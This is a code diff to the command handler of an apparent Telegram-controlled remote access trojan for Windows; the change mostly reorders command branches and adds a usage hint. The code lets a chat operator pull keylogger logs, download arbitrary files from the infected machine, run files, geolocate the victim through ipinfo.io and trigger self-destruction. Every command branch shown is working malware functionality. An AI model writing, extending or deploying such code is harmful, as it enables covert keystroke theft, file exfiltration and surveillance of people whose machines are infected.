@@ -73,7 +73,7 @@ def handle(msg):
 	chat_id = msg['chat']['id']
 	print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 	if checkchat_id(chat_id):
-		functionalities = ['/capture_pc', '/cd', '/pwd', '/to', '/play', '/keylogs', '/pc_info', '/msg_box', '/ip_info', '/download', '/ls', '/run_file', '/self_destruct'] # turn into dictionary?
+		functionalities = ['/capture_pc', '/cd', '/download', '/ip_info', '/keylogs', '/ls', '/msg_box', '/pc_info', '/play', '/pwd', '/run_file', '/self_destruct', '/to'] # turn into dictionary?
 		if 'text' in msg:
 			command = msg['text']
 			response = ''
@@ -92,49 +92,6 @@ def handle(msg):
 					response = os.getcwd() + '>'
 				except:
 					response = 'No subfolder matching ' + command
-			elif command == '/pwd':
-				response = os.getcwd()
-			elif command.startswith('/to'):
-				command = command.replace('/to','')
-				if command == '':
-					response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
-				else:
-					targets = command[:command.index('/')]
-					if platform.uname()[1] in targets:
-						command = command.replace(targets, '')
-						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
-						handle(msg)
-			elif command.startswith('/play'):
-				command = command.replace('/play ', '')
-				systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
-				systemCommand += command
-				systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
-				if os.system(systemCommand) == 0:
-					response = 'YouTube video is now playing'
-				else:
-					response = 'Failed playing YouTube video'
-			elif command == '/keylogs':
-				bot.sendChatAction(chat_id, 'upload_document')
-				bot.sendDocument(chat_id, open(log_file, "rb"))
-			elif command == '/pc_info':
-				bot.sendChatAction(chat_id, 'typing')
-				info = ''
-				for pc_info in platform.uname():
-					info += '\n' + pc_info
-				response = info
-			elif command.startswith('/msg_box'):
-				message = command.replace('/msg_box', '')
-				if message == '':
-					response = '/msg_box yourText'
-				else:
-					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
-					response = 'MsgBox Displayed'
-			elif command == '/ip_info':
-				bot.sendChatAction(chat_id, 'find_location')
-				info = requests.get('http://ipinfo.io').text
-				response = info
-				location = (loads(info)['loc']).split(',')
-				bot.sendLocation(chat_id, location[0], location[1])
 			elif command.startswith('/download'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/download', '')
@@ -147,6 +104,15 @@ def handle(msg):
 						bot.sendDocument(chat_id, open(path_file, 'rb'))
 					except:
 						response = 'Could not find ' + path_file
+			elif command == '/ip_info':
+				bot.sendChatAction(chat_id, 'find_location')
+				info = requests.get('http://ipinfo.io').text
+				response = info
+				location = (loads(info)['loc']).split(',')
+				bot.sendLocation(chat_id, location[0], location[1])
+			elif command == '/keylogs':
+				bot.sendChatAction(chat_id, 'upload_document')
+				bot.sendDocument(chat_id, open(log_file, "rb"))
 			elif command.startswith('/ls'):
 				bot.sendChatAction(chat_id, 'typing')
 				command = command.replace('/ls', '')
@@ -160,6 +126,34 @@ def handle(msg):
 				for file in files:
 					human_readable += file + '\n'
 				response = human_readable
+			elif command.startswith('/msg_box'):
+				message = command.replace('/msg_box', '')
+				if message == '':
+					response = '/msg_box yourText'
+				else:
+					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
+					response = 'MsgBox Displayed'
+			elif command == '/pc_info':
+				bot.sendChatAction(chat_id, 'typing')
+				info = ''
+				for pc_info in platform.uname():
+					info += '\n' + pc_info
+				response = info
+			elif command.startswith('/play'):
+				command = command.replace('/play ', '')
+				command = command.strip()
+				if len(command) > 0:
+					systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
+					systemCommand += command
+					systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
+					if os.system(systemCommand) == 0:
+						response = 'YouTube video is now playing'
+					else:
+						response = 'Failed playing YouTube video'
+				else:
+					response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
+			elif command == '/pwd':
+				response = os.getcwd()
 			elif command.startswith('/run_file'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/run_file', '')
@@ -187,6 +181,16 @@ def handle(msg):
 					os.remove(target_shortcut)
 				while True:
 					sleep(10)
+			elif command.startswith('/to'):
+				command = command.replace('/to','')
+				if command == '':
+					response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
+				else:
+					targets = command[:command.index('/')]
+					if platform.uname()[1] in targets:
+						command = command.replace(targets, '')
+						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
+						handle(msg)
 			elif command == '/help':
 				response = "\n".join(str(x) for x in functionalities)
 			else: # redirect to /help
